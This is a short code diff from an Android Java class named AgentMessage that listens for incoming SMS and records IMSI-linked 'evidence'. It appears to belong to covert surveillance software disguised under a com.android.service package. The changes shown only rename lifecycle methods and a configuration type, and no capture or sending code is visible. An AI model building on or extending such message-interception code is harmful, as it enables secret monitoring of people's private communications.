@@ -20,6 +20,7 @@ import com.android.service.Sms;
 import com.android.service.agent.sms.MmsBrowser;
 import com.android.service.agent.sms.SmsBrowser;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.evidence.Markup;
 import com.android.service.interfaces.Observer;
@@ -45,7 +46,7 @@ public class AgentMessage extends BaseAgent implements Observer<Sms> {
 	// private SmsHandler smsHandler;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerSms.self().attach(this);
 
 		final Markup storedImsi = new Markup(this);
@@ -85,13 +86,13 @@ public class AgentMessage extends BaseAgent implements Observer<Sms> {
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerSms.self().detach(this);
 		// smsHandler.quit();
 	}
 
 	@Override
-	public boolean parse(AgentConf conf) {
+	public boolean parse(ConfAgent conf) {
 		setPeriod(NEVER);
 		setDelay(100);
 
@@ -99,7 +100,7 @@ public class AgentMessage extends BaseAgent implements Observer<Sms> {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 
 	}
 
